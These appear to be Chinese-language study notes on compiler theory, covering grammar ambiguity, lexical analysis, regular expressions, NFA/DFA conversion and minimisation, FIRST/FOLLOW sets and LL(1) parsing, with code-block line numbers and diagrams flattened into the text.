语法树的生成规律不同，但最终生成的语法树形状完全相同 一般推导 1234567graph TB A[&lt;无符号整数&gt;] --&gt; B[&lt;数字串&gt;] B --&gt; C[&lt;数字串&gt;] B --&gt; D[&lt;数字&gt;] C --&gt; E[&lt;数字&gt;] E --&gt; F[1] D --&gt; G[0] 树与推导：句型推导过程 &hArr; 句型语法树的生长过程 ①由推导构造语法树 从识别符号开始，自左向右建立推导序列 &rArr; 由根节点开始，自上而下建立语法树 ②由语法树构造推导 自叶而根修剪子树的末端节点，直至把整棵树剪掉（留根），每剪一次对应一次归约 &rArr; 从句型开始，自右向左地逐步进行归约，建立推导序列 2.文法的二义性 定义：若对于一个文法的某一句子存在两棵不同的语法树，则该文法是二义性文法，否则是无二义性文法 换而言之，无二义性文法的句子只有一棵语法树，尽管推导过程可以不同 12345比如二义性文法: G[E]: E := E+E | E*E | (E) | i Vn = &#123;E&#125; VT = &#123;+,*,(,),i&#125;针对 i+i*i 有两种不同的语法树 定义：若一个文法的某句子存在两个不同的规范推导（最右推导），则该文法是二义性的，否则是无二义性的 若文法是二义性的，则在编译时就会产生不确定性，遗憾的是在理论上已经证明：文法的二义性是不可判定的，即不可能构造出一个算法，通过有限步骤来判定任一文法是否有二义性 现在的解决办法是：提出一些限制条件，称为无二义性的充分条件，当文法满足这些条件时，就可以判定文法是无二义性的。 由于无二义性文法比较简单，我们也可以采用另一种解决办法：即不改变二义性文法，而是确定一种编译算法，使该算法满足无二义性充分条件。 句柄：句型的句柄是和某产生式右部匹配的子串。句柄是直接短语，即某产生式的右部，具有最左性 若句柄不存在重复，就说明文法无二义性 如 S &rarr; ABC ，ABC为该句子的句柄 三、词法分析 词法分析 （Lexical Analysis） 实现词法分析器的程序称为词法分析程序（扫描器） 词法分析程序的主要任务：对构成源程序的字符串从左到右的扫描，逐个字符地读入源程序字符并按照构词规则切分成一个一个具有独立意义的单词。并确定其属性（如保留字、标识符、运算符、界限符和常量等）。再把它们转换成长度统一的标准形式——属性字（TOKEN）。 词法分析是编译过程中的第一个阶段，在语法分析前进行。也可以和语法分析结合在一起作为一遍，由语法分析程序调用词法分析程序来获得当前单词供语法分析使用。 1234graph LR A[源程序] --&gt; B[词法分析程序] B -- Token --&gt; C[语法分析程序] C -- get token --&gt; B 为什么将词法分析工作从语法分析工作中独立出来？ 简化设计 改进编译效率 增加编译系统的可移植性 3.1 词法分析器的要求 功能：输入源程序，输出单词符号 单词符号是一个程序语言的基本语法符号 单词的分类： 1.关键字：由程序语言定义的具有固定意义的标识符。也称为保留字或基本字 2.标识符：用来表示程序中各种名字的字符串。 3.常 数：常数的类型一般有整型、实型、布尔型、文字型。 4.运算符：如+、－ 、*、/ 等。 5.界限符：如逗号、分号、括号等。 一个程序语言的关键字、运算符、界限符都是固定的，即数量有限及意义明确；而对于标识符和常数通常是不确定的。 词法分析器所输出的单词符号常常表示为二元式：（单词种别，单词符号的属性值） 单词种别一般将①标识符归为一种，②常数按类型分种（整数实数布尔），③关键字全体视为一种，或者一个一种，④运算符可采用一符一种，⑤界符一般也用一符一种。 如果一个种别只含一个单词符号，那么对于这个单词符号，种别编码可完全代表其自身。若一个种别有多个单词符号，那么，对于每个单词符号，除了给出种别编码外，还应给出有关的单词符号的属性信息。 单词符号的属性是指单词符号的特性或特征。属性值是反应特性或特征的值。 1234567891011while(i&gt;=j)i++;//以该语句为示例//该句的单词符号序列如下:&lt;while, -&gt;&lt;(, -&gt;&lt;id, point(i)&gt;//存放指向i的指针&lt;&gt;=, -&gt;&lt;id, point(j)&gt;//存放指向j的指针&lt;), -&gt;&lt;id, point(i)&gt;&lt;--, -&gt;&lt;;, -&gt; 3.2 词法分析器的设计Ⅰ、输入、预处理词法分析器工作的第一步是输入源程序文本。输入串一般是放在一个缓冲区中，这个缓冲区称输入缓冲区。词法分析的工作（单词符号的识别）可以直接在这个缓冲区中进行。但在许多情况下，把输入串预处理一下，对单词符号的识别工作将是比较方便的。 预处理的主要工作 某些跳格符、回车符和换行符等编辑性字符，在别处的任何出现都没有意义，预处理时可以将其剔掉 注解部分——仅在于改善程序的易读性和易理解性。对于它们，预处理时可以将其剔掉 空白符（一个或相继数个）用作单词符号之间的间隔，即用作界符。在这种情况下，预处理时可把相继的若干个空白结合成一个。 Ⅱ、单词符号的识别：超前搜索 上图为词法分析器结构，当词法分析器调用预处理子程序处理出一串输入字符放进扫描缓冲区之后，分析器就从此缓冲区种逐一识别单词符号。当缓冲区里的字符串被处理完之后，它又调用预处理程序装入新串。 超前搜索的原因 在程序中有一些单词的识别经常需要多读入一些字符才能知道哪些字符组成一个单词 Ⅲ、状态转换图状态转换图是一张有限方向图，是设计词法分析器的有效工具。 1234graph LR 0--字母--&gt;1 1--字母或数字--&gt;1 1--其他--&gt;2[*] 一个状态转换图可用于识别（或接受）一定的字符串 3.3 正规表达式与有限自动机1.正规式与正规集正规式也称正则表达式（regular expression），是说明单词的模式（pattern）的一种重要的表示法，是定义正规集的数学工具 正规式及其所表示的正规集的定义：设字母表为∑，辅助字母表∑‘ = { φ，ε， |，&bull;，*，（，）}， ① ε 和 φ 都是 ∑ 上的正规式，他们所表示的正规集分别为 { ε }和 { } ； ② 对任何 a ∈ ∑ ，a 是 ∑ 上的一个正规式，他所表示的正规集为 { a } ； ③ 假定 e1 和 e2 都是 ∑ 上的正规式他们所表示的正规集分别为 L(e1) 和 L(e2)，那么，( e1 ) ， e1 | e2 ， e1 &bull; e2 ， e1 也都是正规式，他们所表示的正规集分别为 L( e1 )， L( e1 ) &cup; L( e2 )， L( e1 ) L( e2 ) 和 ( L( e1 ) )\ ； ④仅由有限次使用上述三步骤而定义的表达式才是 ∑ 上的正规式，仅有这些正规式所表示的集合才是 ∑ 上的正规集。 注意，| 、 &bull; 、* 、均为正规式的运算符 | 表示或 &bull; 表示连接 * 表示闭包，即任意有限次的自重复连接 在不混淆的情况下，括号可以省去，但规定算符的优先顺序为 *， &bull; ，|。连接符 &bull; 一般可省略不写，三个算符均为左结合的。 1234567例:a &#123;a&#125;a|b &#123;a,b&#125;ab &#123;ab&#125;(a|b)(a|b) &#123;aa,ab,ba,bb&#125;a* &#123;ε,a,a,……,任意个a的串&#125;(a|b)* &#123;ε,a,b,aa,ab,bb,……,所有由a和b组成的串&#125; 结论：程序设计语言的单词都能用正规式来定义 正规式的等价性：若两个正规式 e1 和 e2 所表示的正规集相同，则说 e1 和 e2 等价，写作 e1 = e2 。 123例:e1 = (a|b) , e2 = (b|a) ,e1 == e2e1 = b(ab)* , e2 = (ba)*b , e1 == e2 正规式服从的规律有： 或服从交换律：U|V = V|U 或的可结合律：U|(V|W) = (U|V)|W 连接的可结合律：(UV)W = U(VW) 分配律：U(V|W) = UV | UW，(V|W)U = VU | WU ε是连接的恒等律：εU = U，Uε = U 素零一律：U|U = U 或的抽取律： U* = ε|U|UU|… 2.确定有限自动机确定有限自动机（有穷自动机）作为一种识别装置，能准确地识别正规集，即识别正规文法所定义的语言和正规式所表示的集合，引入有穷自动机这个理论，正是为词法分析程序的自动构造寻找特殊的方法和工具 有穷自动机分两类：确定的有限自动机（deterministic Finite Automata）和不确定的有限自动机（Nondeterministic Finite Automata） 12345graph LR RE(RE) RE --&gt; NFA(NFA) NFA --&gt; DFA(DFA) DFA --&gt; minDFA(minDFA) DFADFA定义：一个确定的有穷自动机（DFA）M是一个五元组： M = （ S ，∑ ，δ ，s0 ，F ） 其中： S 是一个有穷集，他的每个元素称为一个状态； Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表 δ 是转换函数，实在 S × Σ &rarr; S 上的单值部分映射，即，如果 δ（s，a）= s‘ ， (s ∈ S，s’ ∈ S ) 就意味着，当前状态为s，输入符为a时，将转换至下一个状态s’，s’称作s的一个后继状态 s0 ∈ S 是唯一的一个初态 F &sub; S 是一个终态集（可空），终态也称可接受状态或结束状态 DFA可以用一个矩阵表示，该矩阵的行表示状态，列表示输入字符，即s行a列的矩阵元素表示 δ（s，a）的值。这个矩阵称为状态转换矩阵。 一个DFA也可以表示为一张确定的状态转换图 假定DFA M含有 m个状态和 n个输入字符，那么，这个图含有m个状态结点，每个结点顶多有n条箭弧射出和别的结点相连接，每条箭弧用Σ中的一个不同输入字符作标记，整张图含有唯一的一个初态结点和若干个（可以是0个）终态结点。 一般来说，初态节点旁边标以 &rArr; ；终态节点用双圈表示。 例如： 状态 a b +S U V U Q V V U Q -Q Q Q 如上表，可表示(a|b)*，也可画成如下图 DFA的确定性 1.映射δ ： S × Σ &rarr; S 是一个单值函数。也就是说，对任何状态s∈S和输入符号 a ∈ Σ ，f（s，a）唯一地确定了下一状态。从转换图的角度来看，假定字母表 Σ 含有n个输入字符，那么，任何一个状态结最多只有n条弧射出，而且每条弧以一个不同的输入字符标记。 NFANFA的定义：一个非确定的有穷自动机（NFA）M是一个五元组：M = （ S ，∑ ，δ ，S0 ，F ） 其中： S 是一个有穷集，他的每个元素称为一个状态； Σ 是一个有穷字母表，他的每个元素称为一个输入符号，所以也称 Σ 为输入符号表 δ 是转换函数，实在 S × Σ* &rarr; S 上的单值部分映射，即， δ： S × Σ* &rarr; 2S 表明在某状态下对于某输入符号可能有多个后继状态 S0 &sub; S 是一个非空初态集 F &sub; S 是一个终态集（可空），终态也称可接受状态或结束状态 如图，为一个NFA ∑* 上的符号串 t 被 NFA M 接受也可以这样理解： 对于Σ*中的任何一个串t，若存在一条从某一初态结到某一终态结的道路，且这条道路上所有弧的标记字依序连接成的串(不理采那些标记为ε的弧)等于t，则称t可为NFA M所识别(读出或接受)。若M的某些结既是初态结又是终态结，或者存在一条从某个初态结到某个终态结的道路,其上所有弧的标记均为ε，那么空字可为M所接受。 NFA M所能接受的符号串的全体记为L(M) 结论： Σ 上一个符号串集 V &sub; Σ* 是正规的，当且仅当存在一个 Σ 上的不确定的有穷自动机M，是的 V = L(M) 12345678910111213NFA构造方法:Σ上的字母a是正规式,构造等价的NFA为 一个初态,一个终态,中间标记ε弧正规式A和B连接是正规式,构造等价NFA为 初态是A的初态,终态是B的终态,从A的终态到B的初态标记为ε弧A|B是正规式,构造等价的NFA为 构造新的初态和终态,从初态引ε到A和B的初态,从到A到B的终态引ε到终态A*是正规式,构造的等价NFA为 构造新的初态和终态，从初态引ε到终态和A的初态,从A的终态引ε到终态和A的初态 NFA和DFA的等价性 DFA是NFA的特例 对于每个NFA M，存在一个DFA M’ ，使得L( M ) =L( M’ )。对每个NFA M存在着与之等价的DFA M’。即：对于任何两个有穷自动机M和M’，如果L( M )=L( M’ )，则称M与M’是等价的。 有一种算法，将NFA转换成接受同样语言的DFA。这种算法称为子集法。 与某一NFA等价的DFA不唯一 从NFA的矩阵表示中，表项通常是一状态的集合，而在DFA的矩阵表示中，表项是一个状态，NFA到相应的DFA的构造的基本思路是： DFA的每一个状态对应NFA的一组状态。 DFA使用他的状态去记录在NFA读入的一个输入符号后可能达到的所有状态。 NFA确定化算法（ NFA &rarr; DFA 的转换）假设NFA N = （ K， Σ ， f ，K0，Kt ）按如下办法构造一个DFA M=（ S， å，δ，S0 ，St），使得L(M) = L(N) ： M的状态集 S 由 K 的一些子集组成。用 [ S1 ，S2 ，…，Sj ] 表示 S 的元素，其中 S1 ，S2 ，…，Sj 是K的状态。并约定， 状态 S1 ，S2 ，…，Sj 是按某种规则排列的，即对于子集{S1 ，S2 } = {S2 ，S1 }来说，S的状态就是 [S1 ，S2 ] M和N的输入字母表是相同的，即 Σ 转换函数是这样定义的： δ（ [ S1 ，S2 ，…，Sj ] ，a ） = [ R1 ，R2 ，…，Rt ] ，其中 { R1 ，R2 ，…，Rt } = ε-closure（ move（{S1 ，S2 ，…，Sj } ， a） ） S0 = ε-closure（ K0 ）为 M 的开始状态 St = {Si ，Sk ，…，Se }， 其中 [ Si ，Sk ，…，Se ] ∈ S 且 {Si ，Sk ，…，Se } &cap; Kt &ne; &phi; 状态集合 I 的 ε-闭包，表示为ε-closure( I )，定义为一状态集，是状态集I中的任何状态S经任意条ε弧而能到达的状态的集合。 状态集合I的任何状态S都属于ε-closure(I) 状态集合 I 的 &alpha; 弧转换，定义状态集合 J 表示为 J = move(I,a) ，其中J是所有那些可从I中的某一状态经过一条a弧而到达的状态的全体。 Ia = ε-closure( J ) = ε-closure( move( I , a ) ) 如之前NFA的例子： 1234I=&#123;1&#125;, ε-closure(I) = &#123;1,2&#125;；I=&#123;5&#125;, ε-closure(I) = &#123;5,6,2&#125;；move( &#123;1,2&#125; , a ) = &#123;5,3,4&#125;ε-closure(&#123;5,3,4&#125;) = &#123;2,3,4,5,6,7,8&#125;； 构造NFA N的状态K的子集的算法： ​ 假定所构造的子集族为C，即 C = （T1 ，T2 ，… ， TI ），其中 T1 ，T2 ，… ， TI 为状态K的子集。 123456789101.开始，令ε-closure(K0)为C中的唯一成员，并且他是未被标记的2.while( C中尚未被标记的子集T )do&#123; 标记T; for 每个输入字母a do&#123; U := ε-closure( move(T, a) ); if U 不在 C 中: 将U作为未标记的子集Ti加在C中; &#125;&#125; 例： 如上图为实例NFA，构造其状态转换表 I Ia Ib {i，1，2} {1，2，3} {1，2，4} {1，2，3} {1，2，3，5，6，f} {1，2，4} {1，2，4} {1，2，3} {1，2，4，5，6，f} {1，2，3，5，6，f} {1，2，3，5，6，f} {1，2，4，6，f} {1，2，4，5，6，f} {1，2，3，6，f} {1，2，4，5，6，f} {1，2，4，6，f} {1，2，3，6，f} {1，2，4，5，6，f} {1，2，3，6，f} {1，2，3，5，6，f} {1，2，4，6，f} 将其每个状态确定化，即得到如下等价DFA N 状态转换表如下，将一组状态替换成对应符号。 I Ia Ib S A B A C B B A D C C E D F D E F D F C E minDFA说一个有穷自动机是化简了的，即是说，它没有多余状态并且它的状态中没有两个是互相等价的。一个有穷自动机可以通过消除多余状态和合并等价状态而转换成一个最小的与之等价的有穷自动机。即用一个状态代替所有与其等价的状态。 所谓有穷自动机的多余状态，是指这样的状态：从自动机的开始状态出发，任何输入串也不能到达的那个状态；或者从这个状态没有通路到达终态。 DFA的最小化就是寻求最小状态DFA 最小状态DFA的含义：①没有多余状态（死状态）；②没有两个状态时互相等价的（不可区别）。 两个状态s和t可区别：不满足 兼容性：同时终态或同时非终态 传播性：从s出发读入某个a（a ∈ Σ ）和从t出发读入某个a到达的状态等价 两个状态s和t等价： 如果由 s 出发能导出的所有串的集合与 t 出发能导出的所有串的集合相等，我们称状态 s 与状态 t 是等价的。 如上面示例的DFA，C和F是等价的。 C和F同是终态，读入a到达C和F，C和F同是终态，C和F读入a都到达C，读入b都到达E。 同理D和E也是等价的 DFA最小化的算法：分割法（逐步分组试探法）核心思想：把一个DFA的状态分成一些不相交的子集，使得任何不同的两子集的状态都是可区别的，而同一子集中的任何两个状态都是等价的。算法假定每个状态射出的弧都是完全的,否则，引入一个新状态，叫死状态，该状态是非终态，将不完全的输入弧都射向该状态，对所有输入，该状态射出的弧还回到自己。 12345678910设有DFA M = ( s , ∑ , f, s0 , sz ),最小状态DFA M&apos;1. 因为不难证明，如果si是非终结状态，而sj是终结状态，那么si和sj一定互不等价(根据等价的定义可知，它们导出的符号串集不同)。所以开始可以把K中的终态和非终态分开，分成两个子集，形成一个基本划分： P2＝&#123;I1,I2&#125; (I1∪I2＝K, I1∩I2＝Φ)2. 若此两个子集还可以进行划分，则作进一步的划分，形成Pm ,假定到某个时候Pm已经含有m个子集，记为：Pm＝&#123;I1,I2,…,Im&#125;，设s&apos;和s&quot;是Ii中的任意两个状态，如果对某个a∈Σ,存在Ij ，使 f(s&apos;,a), f(s&quot;,a)∈Ij ，则称s&apos;和s&quot;关于a是拟等价的。 如果存在s&apos;，s&quot;∈Ii，使得对字母表Σ中的某个符号a, s&apos;和s&quot;不为拟等价，则我们说Ii是可分的。 换句话说，令Ii ＝&#123;s1，s2, …，sn&#125; ，如果对某个a∈Σ，使得Ia i＝&#123; f(s1,a)，f(s2,a)，…，f(sn,a)&#125;不全落在现行Pm的某一个子集Ij之中；即Ia i这个集合中的元素分别属于I1，I2，…，Im中的几个不同集合，则Ii可分为几个集合（至少可一分为二）。 3．转2,上述过程务必一再重复，直到P中的每个集合均是不可再分时为止。此时，P所含的集合数不再增加，即P中的每个集合中的状态互相等价，而不同集合间的状态互不等价。4.为P中的每一组选一代表，这些代表构成M&apos;的状态。把原来导入非代表状态的弧均导入其代表即可，即若s&apos;是一代表且f(s&apos;,a)=t,令r是t组的代表，则M&apos;中有一转换f&apos;(s&apos;,a)=r，M&apos;的开始状态是含有S0的那组的代表，M&apos;的终态是含有F的那组的代表。5.去掉M&apos;中的死状态。 正规式与有穷自动机的等价性（Re &hArr; NFA）定理：①对于 Σ 上的NFA M，可以构造一个 Σ 上的正规式R，是的L(R) = L(M)。②对于 Σ 上的任一个正规式R，可以构造一个 Σ 上 的NFA M，是的L(M) = L(R)。 Re &rArr; NFA： 1234567转换方法：我们把状态转换图的概念拓广，令每条弧可用一个正规式标记。1. 在M的状态图上加进两个结点x、y。从x结点用ε弧 连接到M的所有初态结点，从M的所有终态结点ε弧 连接到y结点。形成一个与M等价的M&apos;， M&apos;只有一个初态和一个终态。2. 逐步消去M&apos;中的所有结点，直至只剩下x结点和y结点。在消结过程中，逐步用正规式来标记弧，其消结规则如下：A--R1--&gt;2--R2--&gt;3 ==&gt; 1--R1R2--&gt;21--R1--&gt;2,1--R2--&gt;2 ==&gt; 1--R1|R2--&gt;21--R1--&gt;2--R2--&gt;2--R3--&gt;3 ==&gt; 1--R1R2*R3--&gt;2最后x结点和y结点之间的弧上的标记就是所求的正规式R NFA &rArr; Re 1234567方法如上反转首先，对正规式R构造如下拓广转换图然后通过对R进行分裂和加进新结点的办法，逐步把这个图转变为：每条弧标记为中的一个字母或ε ，其转换规则如下:1--R1R2--&gt;2 ==&gt; A--R1--&gt;2--R2--&gt;31--R1|R2--&gt;2 ==&gt; 1--R1--&gt;2,1--R2--&gt;21--R1R2*R3--&gt;2 ==&gt; 1--R1--&gt;2--R2--&gt;2--R3--&gt;3在整个分裂过程中，所有新结点均采用不同的名字，保留x和y为全图的唯一初态结点和终态结点，至此我们就可以得到一个与R 等价的NFA M 正规文法与有穷自动机的等价性定理：①对于给定的正规文法G[R]，可以直接构造一个NFA M，使得L（M）=L（G）。②对于 Σ 上的任一个NFA M ，可以直接构造正规文法G[R] ，使得L（ R ）=L（ M ）。 把给定的正规文法G[R]转换为一个Σ上的NFA M构造规则: 123456设G[R]=（VN，VT，P，R）， NFA M=（ K，Σ，f，S，Z）1.令 Σ = VT;2. K = VN，S = R；即对G中的每个非终结符生成M的一个状态（不妨取相同的名字，G的开始符号是M的初态;3.增加一个新状态Z，作为NFA M 的终态，Z∈K;4.对G中的形如A-&gt;tB（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数 f（A，t）=B;5.对G中的形如A-&gt;t（其中t为终结符或ε；A和B为非终结符）的产生式,构造M的一个转换函数 f（A，t）=Z; 把给定的å上的NFA M转换为一个正规文法G[R]的构造规则: 123456设NFA M=（ K，Σ，f，S，Z）,G[R]=（VN，VT，P，R）,1.令 VT = Σ ;2.令VN = K即对M的每一个状态生成G中的非终结符（不妨取相同的名字，G的开始符号是M的初态;3.令S=R（如果M有多个初态，应先拓广自动机，引入新初态x）;4.对M 的终态Z增加一个产生式： Z-&gt;ε;5.对M的每一个转换函数f（A，t）=B可写G的一个产生式A-&gt;tB（其中t为终结符或ε;A和B为非终结符）; 词法分析程序的自动构造​ 若对自动机的每一个状态赋予一定的功能，并把其边上的符号视为转移条件，那么自动机就成为一个程序了。 四、语法分析语法分析的主要工作：是识别由词法分析器给出的单词序列是否是给定的正确句子（程序） 语法分析的常用方法：自顶向下的语法分析（Top-Down Parsing）和自底向上的语法分析（Bottom-Up Parsing）两大类 自顶向下语法分析方法：从文法的开始符号（设为 &lt;程序&gt; ）开始进行分析，逐渐推导的往下构造语法树，使其树叶正好构造所给定的源程序串 关键：是确定在推导过程中选择候选式的问题。当进行推导时，一个非终结符可能对应多个产生式，这样我们就无法事先知道应该用哪个产生式，因此必须对文法做一些限制，以便在任何情况下都唔那个确定应该用的产生式 主要思想：从开始符号出发，导出句型并一个符号一个符号地与给定终结符串进行匹配。如果全部匹配成功，则表示开始符号可推导出给定的终结符串。因此判定给定终结符号串是正确句子。 缺点：若在推导过程中，不对文法进行限制，那么产生式的选择成为无根据的，只好一一去尝试所有可能的产生式，直至成功为止。这种方法致命的地方是不断地回溯，大大影响速度。所以自顶向下分析法分为确定和不确定两种。我们在下面讨论确定的分析方法，这种方法简单直观，便于手工构造或自动生成语法分析器。 在推导过程中，对于产生式相同左部含有非终结符开始的右部时，在推到中选用哪个产生式是不能直接知道的，也就是该语法分析的缺点。 1. 首符集、后继符集、选择集（Fisrt(),Follow(),Select()）首符集的定义设G = （ VN ，VT ，P ，S）是上下文无关文法，α 是G的任一符号串，则有 First(α) = { a | α &rArr; αβ，α ∈ VT ，α、β ∈ V\ } 特别地，若 α =*&rArr; ε，则规定 ε ∈ First(α) 即：Fisrt(α)集是从α出发推导出所有符号串首终结符或可能的ε构成的集合。 构造算法1.求Fisrt(X) 123456789101112131415对每一文法符号X∈(VN∪VT），求FIRST(X).(a)若X∈VT,则令FIRST(X)=&#123;X&#125;;(b)若X∈VN,且有产生式X→a……,(a∈VT)，则令a∈FIRST(X);(c) 若X∈VN,有X→ε，则令 ε∈FIRST(X);(d)若 X∈VN, y1, y2,……,yi都∈VN,且有产生式X→ y1 y2…..yn, 当y1, y2,…..yi-1 都 =*=&gt;ε时，（其中1≤i≤n),则FIRST(y1)-ε,FIRST(y2)-ε,….,FIRST(yi-1 )-ε,FIRST(yi)都包含在FIRST(X)中。(e)当(d)中所有yi =*=&gt; ε(i= 1,2,….,n),则FIRST(X)=FIRST(y1)∪FIRST(y2)∪….∪FIRST(yn)∪&#123;ε&#125;反复使用上述（b)～(d) 步直到每个符号的FIRST集合不再增加为止。 2.求Fisrt(α) α = x1x2……xn 123456789101112131415161718法1:1.若n=0,即α=ε,则令FIRST(α)=&#123;ε&#125;;2.否则，对1≤i≤n,求FIRST(xi)3.若n=1,则令 FIRST(α)=FIRST(x1);4.若n≥2且对一切j=1,2,….,i-1都有ε∈FIRST(xj). 则令FIRST(xi )-&#123;ε&#125; FIRST(α),其中2≤i≤n; 若对一切 j=1,2,…,n都有ε∈FIRST(xj),则令ε∈FIRST(α)法2:1.把FIRST(x1)中所有非ε元素加入到FIRST(α)中，即 FIRST(α )=FIRST(x1)-&#123;ε &#125;;若FIRST(x1)包含有ε，则把FIRST(x2)的所有非ε元素加入到 FIRST(α)中，即FIRST(α)=FIRST(α)∪ (FIRST(x2)-&#123;ε&#125;);若FIRST(x1)和FIRST(x2)都包含有 ε，则把FIRST(x3)的所有 非ε元素加到FIRST(α)中;…… 照此方法继续，一直到考察到xn。2.若FIRST(xi ),i= 1,2,…,n;即每个FIRST(xi)中都有ε。则将ε加 到FIRST(α)中。特别地， 若 α=ε ，则FIRST(α)=&#123;ε&#125;. 后继符的定义设G = （ VN ，VT ，P ，S）是上下文无关文法，A ∈ VN 的后继符集合为 Follow(A) = { a | S =*&rArr; μAβ ，a ∈ VT ， a ∈ First(β) ， μ ∈ VT* ，β ∈ V* } 或 Follow(A) = { a | S =*&rArr; …Aa…，a ∈ VT } 特别地，若S =*&rArr; …A ， 则# ∈ Follow(A) 。这里的#是代表一个输入串的结束符 表示所有句型中紧挨着A出现的终结符或#均是Follow(A)的元素 构造算法12345678910111213落#下S(a)对文法开始符号S,令# ∈ FOLLOW(S).右部Follow(b)若B→αAβ是一个产生式,则令FIRST(β)-&#123;ε&#125; 属于FOLLOW(A);守门员福利(c) 若B→αA是一个产生式，或B→αAβ是一个产生式且有ε∈FIRST(β), 则令FOLLOW(B)是FOLLOW(A)的子集。即把FOLLOW(B)的所有元素加入到FOLLOW(A)中。(d)反复使用(b)直到每个非终结符的 FOLLOW集合不再增加为止。 选择集的定义对于给出的上下文无关的文法产生式 A &rarr; α ， A ∈ VN ， α ∈ V* ，则 Select(A &rarr; α) = First(α) ，当 α =*&rArr; ε 时 Select(A &rarr; α) = Fisrt(α) &cup; Follow(A) ，其他情况 构造算法12345(a)求FIRST(α);(b)若ε∈FIRST(α),则令SELECT(A→α)=FIRST(α) 否则求FOLLOW(A),并令 SELECT(A→α) = FIRST(α) ∪ FOLLOW(A). 2. LL(1)分析法当一个文法是LL(1)文法时，则该文法一定能采用确定的自顶向下的分析方法进行分析。 定义：一个上下文无关文法是LL(1)文法的充分必要条件是每个非终结符A的两个不同产生式，A &rarr; α ，A &rarr; β ，满足 Select(A &rarr; α) &cap; Select(A &rarr; β) = &empty; ，其中，α和β不能同时 =*&rArr; ε。 文法的等价变换确定的自顶向下分析要求给定语言的文法必须是 LL(1)形式，然而，不一定每个语言都是LL(1)文法，对一个语言的非LL(1)文法是否能变换为等价的LL(1)形式以及如何变换是我们讨论的主要问题。由LL(1)文法的定义可知若文法中含有左递归或含有左公共因子，则该文法肯定不是LL(1)文法，因而，我们设法消除文法中的左递归，提取左公共因子对文法进行等价变换。 Ⅰ提取左公共因子1234对A→ αβ1| αβ2 | … | αβn提取左公因子为： A→ α A&apos; A&apos;→ β1 | β2 | … | βn若在βi , βj , βk…中仍含有左公共因子，可再进行提取，这样反复进行提取直到所引进的新非终结符的有关产生式均无左公共因子为止 结论：一个文法提取了左公共因子后，只解决了相同左部产生式的右部FIRST集不相交问题。当改写后的文法不含有空产生式，且无左递归时，则改写后的文法是LL(1)文法。否则还需用LL(1)文法的判别方法进行判断才能确定是否为LL(1)文法。 Ⅱ消除左递归一个文法含有下列形式的产生式之一时： 1) A→A β, A∈VN , β ∈ V* 2) A→B β, B→A α, A,B∈VN, α ,β ∈ V* 则称该文法是左递归的。 含有左递归的文法不能采取自顶向下分析法。 1234567891011121314151617181920212223242526272829303132333435361):把直接左递归改写为右递归设有文法产生式: A→Aβ|γ. 其中β非空， γ不以A打头。 可写为: A → γA&apos; A&apos; → βA&apos; | ε 一般情况下，假定关于A的产生式是： A→A α1| A α2 | … | A αm | β1 | β2 | …| βn 其中，αi(1≤i≤m)均不为空， βj(1≤j≤n)均不以A打头。 则消除直接左递归后改写为： A → β1 A&apos; | β2 A&apos; | … | βn A&apos; A&apos;→ α1 A&apos; | α2 A&apos; | … | αm A&apos; | ε2):间接消除左递归对于间接左递归的消除需要先将间接左递归变为直接左递归，然后再按1)清除左递归哪一步有左递归，就把那一步的间接左递归代入产生式产生直接左递归----------------------------------------------------3):消除文法中一切左递归的算法设非终结符按某种规则排序为A1, A2,… An 。For i:=1 to n do begin For j:=1 to i-1 do begin 若Aj的所有产生式为： Aj → δ1 | δ2 | … | δn 替换形如Ai → Aj γ的产生式为： Ai → δ1γ | δ2γ | … | δnγ end 消除Ai中的一切直接左递归 end 递归下降分析程序构造在程序语言的语法定义中有许多采用递归定义。我们在对它进行语法分析时，编制的处理程序也采取递归的方式，可使其结构简单易读。但由于频繁地调用子程序大大地降低了分析速度 主要思想：对每个非终结符按其产生式结构写出相应的语法分析子程序。因为每个文法递归相应子程序也递归，子程序的结构与产生式结构一致。所以称此种方法称为递归子程序法或递归下降法。 用程序表示递归子程序的内部结构： 123456789101112131415161718192021222324252627 设A是一个非终结符：A→β1 A→β2 ┊ A→βn 则写 ζ(A) &lt;==&gt; if char∈first(β1 ) thenζ(β1 ) else if char ∈ first(β2 ) then ζ(β2 ) else… if char∈first(βn ) then ζ(βn) else ERROR其中ζ(βi)表示调用处理符号串βi的子程序。对A的任一右部i 设为： βi = y1 y2 … yn则定义ζ( βi) &lt;==&gt; beginζ(y1);ζ(y2);…;ζ(yn) end其中yj可分为下列两种情况（j=1,…,n):1) yj∈VT,则 ζ( yj) &lt;==&gt; if char≠ yj then ERROR else READ(char)2) yj∈VN,则ζ(yj)表示调用关于yj的递归子程序。对文法加限制：1.任一非终结符B都不是左递归的，否则会产生死循环。2.对A的任意两个右部βi , βj ,有：first(βi) ∩ first(βj) = φ ,First(βi)表示βi所能导出串的第一个符号的集合。显然，每个βi的first(βi)是互不相同的，否则则无法判断应执行哪个ζ(βi )。 预测分析程序LL(k)文法是采取确定的自左至右扫描（输入串）和自顶向下分析技术的最大一类文法。 LL系指：自左向右扫描（输入串），自上而下进行最左推导。一般来说，一个文法当其分析器对输入串进行自左至右扫描并采用自顶向下方法进行分析的过程中，如果每步仅利用当前的非终结符（事实上此时它已位于分析栈顶）和至多向前查看k个输入符号就能唯一 决定采取什么动作，那么这个文法称为LL(K)文法。 对于大多数程序设计语言而言。K=1就足够了。因此我们将主要讨论k=1的情形。 LL(1)文法的分析过程设分析的当前格局为（x1x2 …. xn#, y1y2 …. ym#) 其中xi表示句型的前端部分，诸yj表示输入流的后端部分（终结符串）。则可能有下述动作之一： 1.替代：当x1∈VN时，则选相应的候选式去替换x1 。 2.匹配：当x1∈VT时，它与y1进行匹配，其结果为两种可能，如 果匹配成功，则去掉x1和y1（即指针后移一位）否则报错。 3.接受：当格局为(#, #）时，报告分析成功结束。 从实现的角度来说，上述替换过程需要花较多的时间，因为它除了把一个候选式替换掉x1,还需要x2 … xn统统进行移位处理，这时很麻烦的。我们的处理方法是用栈来保存x1x2 … xn,而且是把xn作为栈底， x1作为栈顶，那么上述的替换动作就简单了，只需在栈顶进行替换。即去掉x1把候选式的符号串按逆序方式压入栈中即可。 LL(1)方法的实现LL(1)方法在实现时用到一个LL(1)分析矩阵和一个分析栈以及预测分析程序。 分析矩阵的元素M[A,a]中的下标A为非终结符，a为终结符或句子结束标记”#”，矩阵元素M[A,a]的内容为一条关于A的产生式。 